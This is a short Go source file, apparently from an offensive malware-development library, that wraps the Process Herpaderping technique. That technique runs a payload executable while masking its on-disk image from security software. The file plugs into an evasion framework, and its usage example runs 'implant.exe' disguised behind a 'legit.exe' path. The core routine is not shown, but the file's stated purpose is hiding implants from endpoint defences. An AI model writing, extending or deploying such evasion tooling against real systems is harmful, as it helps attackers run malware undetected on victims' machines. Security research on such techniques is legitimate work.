//go:build windows

package herpaderping

import (
	"github.com/oioio-space/maldev/evasion"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

type herpaTechnique struct{ cfg Config }

func (t *herpaTechnique) Name() string { return "herpaderping" }
func (t *herpaTechnique) Apply(c evasion.Caller) error {
	// Wire the Caller from the evasion interface into Config
	if c != nil {
		if wc, ok := c.(*wsyscall.Caller); ok {
			t.cfg.Caller = wc
		}
	}
	return Run(t.cfg)
}

// Technique returns an evasion.Technique that executes a PE via Process Herpaderping.
//
// Example:
//
//	techniques := []evasion.Technique{
//	    herpaderping.Technique(herpaderping.Config{
//	        PayloadPath: "implant.exe",
//	        TargetPath:  `C:\Temp\legit.exe`,
//	    }),
//	}
//	evasion.ApplyAll(techniques, nil)
func Technique(cfg Config) evasion.Technique {
	return &herpaTechnique{cfg: cfg}
}
